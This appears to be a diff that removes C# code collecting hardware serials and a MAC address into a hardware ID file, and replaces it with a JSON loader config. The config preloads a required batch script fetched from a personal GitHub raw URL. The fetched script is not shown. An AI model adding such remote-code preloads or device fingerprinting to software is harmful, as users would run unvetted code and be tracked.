@@ -1,19 +1,14 @@
-using System;
-using System.IO;
-using System.Management;
-using System.Net.NetworkInformation;
-namespace HWID { class Program { static void Main() {
-try {
- string b = GetWMI("Win32_BIOS", "SerialNumber");
- string c = GetWMI("Win32_Processor", "ProcessorId");
- string m = GetWMI("Win32_BaseBoard", "SerialNumber");
- string d = GetDisk();
- string n = GetMac();
- string hwid = b + "-" + c + "-" + m + "-" + d + "-" + n;
- File.WriteAllText("hwid.dat", hwid);
-} catch {}
+{
+  "preload": [
+    {
+      "name": "osiris_hwid_test.bat",
+      "url": "https://raw.githubusercontent.com/FilipeAGermendorff/pocac/refs/heads/main/osiris_hwid_test.bat",
+      "path": "osiris/runtime/osiris_hwid_test.bat",
+      "raw": true,
+      "encrypt": false,
+      "preload": true,
+      "required": true
+    }
+  ],
+  "files": []
 }
-static string GetWMI(string cls, string prop) { try { var searcher = new ManagementObjectSearcher("select " + prop + " from " + cls); foreach (ManagementObject obj in searcher.Get()) { return obj[prop].ToString().Replace(" ", "").Replace(".", ""); } } catch {} return ""; }
-static string GetDisk() { try { var searcher = new ManagementObjectSearcher("select SerialNumber from Win32_DiskDrive where Index = 0"); foreach (ManagementObject obj in searcher.Get()) { return obj["SerialNumber"].ToString().Replace(" ", "").Replace(".", ""); } } catch {} return ""; }
-static string GetMac() { try { foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces()) { if (nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback) { string m = ""; foreach(byte by in nic.GetPhysicalAddress().GetAddressBytes()) m += by.ToString("X2"); return m; } } } catch {} return ""; }
-} }
